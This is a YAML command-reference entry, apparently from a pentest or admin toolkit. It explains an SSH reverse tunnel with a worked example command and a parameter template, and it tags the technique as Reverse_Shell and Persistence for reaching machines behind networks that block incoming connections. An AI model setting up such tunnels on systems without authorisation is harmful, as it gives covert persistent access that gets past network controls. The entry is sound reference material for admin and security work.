---
description: |
  SSH reverse tunnel. Allows you to make a connection from a remote machine, to the initiator of the tunnel, without having direct access to the network. For example, to login to a machine whose network does not allow incoming connections, that machine can execute the following: "ssh -f -N -R 14000:localhost:22 user@10.10.10.10 -p 2222"
  In this case the initiator will connect to the remote machine through SSH on port 2222 and create a tunnel from the remote host localhost:14000 to the initiator SSH port 22. Once run, you can login to the initiator from the remote machine, by "ssh initiator_user@localhost -p 14000". This works best when the remote machine accepts the pubkey from the initiator, otherwise a password needs to be entered.

  Command Reference:

    Local Port: Port of the machine creating the reverse tunnel

    Remote Port Tunnel: The port of the remote machine, to which it listens as one end of the tunnel.

    Remote Address Tunnel: Remote address the remote machine uses to listen for connections to the tunnel.

    Remote User: User to login to the remote machine through ssh

    Remote IP: IP address of the remote machine

    Remote SSH Port: The port that the remote machine listens to for SSH connections

command: |
  ssh -f -N -R <remote_port_tunnel>:<remote_address_tunnel>:<local_port> <remote_user>@<remote_ip> -p <remote_ssh_port>
  
items:

target: |
  - Linux_target
  - MacOS_target
  - Windows_target
  
OS:
  - Linux
  
environment: |
  - Networking
  
command_types:
  - Admin
  - Reverse_Shell
  - Persistence
  
references:

---
